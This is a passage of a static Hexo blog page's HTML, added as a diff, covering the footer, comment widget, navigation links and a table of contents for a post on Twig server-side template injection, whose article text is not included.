+                    :</strong> 2026-04-13 20:33:41
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://s0lowalker.github.io/2026/04/11/twig模板下的SSTI/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">#漏洞学习笔记</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/04/11/Jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84SSTI/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Jinja2常见关键字被ban后的SSTI</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/04/10/phpMyAdmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(CVE-2018-12613)/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">phpMyAdmin文件包含漏洞(CVE-2018-12613)</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      (function() {
+        const startPath = location.pathname;
+        const startTime = Date.now();
+        const retryDelay = 200;
+        const retryLimit = 5000;
+
+        const runWaline = () => {
+          if (location.pathname !== startPath) {
+            return;
+          }
+
+          const container = document.getElementById('waline');
+          if (!container) {
+            if (Date.now() - startTime < retryLimit) {
+              setTimeout(runWaline, retryDelay);
+            }
+            return;
+          }
+
+          if (window.redefineWalineInstance?.destroy) {
+            window.redefineWalineInstance.destroy();
+          }
+
+          container.innerHTML = '';
+          window.redefineWalineInstance = init({
+            el: '#waline',
+            serverURL: 'https://example.example.com',
+            path: location.pathname,
+            dark: 'body[class~="dark-mode"]',
+            reaction: false,
+            requiredMeta: ['nick', 'mail'],
+            emoji: [],
+                      lang: 'zh-CN',
+          });
+        };
+
+        runWaline();
+      })();
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">SSTI之twig</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Twig%E4%B8%8ESSTI"><span class="nav-text">Twig与SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#twig%E7%AE%80%E4%BB%8B"><span class="nav-text">twig简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#twig%E7%9A%84%E4%B8%89%E7%A7%8D%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%BB%93%E6%9E%84"><span class="nav-text">twig的三种基础语法结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E6%A0%B7%E4%BE%8B"><span class="nav-text">开发中的代码样例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E7%9A%84%E6%A0%B7%E4%BE%8B"><span class="nav-text">安全的样例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%A0%B7%E4%BE%8B"><span class="nav-text">不安全的样例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B"><span class="nav-text">检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E6%B2%99%E7%AE%B1%E6%A8%A1%E5%BC%8F%E5%88%A9%E7%94%A8"><span class="nav-text">非沙箱模式利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E6%A8%A1%E5%BC%8F%E5%88%A9%E7%94%A8"><span class="nav-text">沙箱模式利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5"><span class="nav-text">防御手段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-text">绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="nav-text">字符串拼接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8attribute%E5%87%BD%E6%95%B0"><span class="nav-text">利用attribute函数</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">SoloWalker</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        11 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
